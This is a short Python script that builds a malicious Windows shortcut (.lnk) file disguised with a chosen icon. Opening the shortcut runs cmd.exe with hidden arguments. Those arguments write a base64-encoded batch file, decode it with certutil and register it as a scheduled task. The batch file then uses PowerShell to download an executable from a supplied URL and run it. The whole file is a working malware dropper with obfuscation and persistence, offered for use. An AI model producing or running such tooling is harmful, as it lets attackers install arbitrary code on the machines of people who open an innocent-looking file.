import os
import sys
import win32com.client
import base64

def create_shortcut(target_path, lnk_path, icon_path, fileurl):
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(lnk_path)
    shortcut.TargetPath = target_path
    string = f"""start /min powershell -command "IWR '{fileurl}' -OutFile '%temp%\\fqnIOQdR.exe'; schtasks /delete /f /tn n5dMmJEBYc; start %temp%\\fqnIOQdR.exe"""
    data = base64.b64encode(string.encode()).decode()
    shortcut.Arguments = f"/c echo {data} > %TEMP%\\KgZvPA3S.bat & certutil -f -decode %TEMP%\\KgZvPA3S.bat %TEMP%\\KgZvPA3S.bat & schtasks /create /f /sc minute /mo 1 /tn n5dMmJEBYc /tr \"%TEMP%\\KgZvPA3S.bat\""
    try:
        shortcut.IconLocation = icon_path
    except:pass
    shortcut.save()

def main():
    current_dir = os.path.dirname(os.path.abspath(__file__))
    lnk_file_path = os.path.join(current_dir, "icon.lnk")

    url = sys.argv[1]
    try:
        ico_path = sys.argv[2]
    except:
        ico_path = ''

    create_shortcut("cmd.exe", lnk_file_path, ico_path, url)
    input('Done! Shortcut created !')

if __name__ == "__main__":
    main()
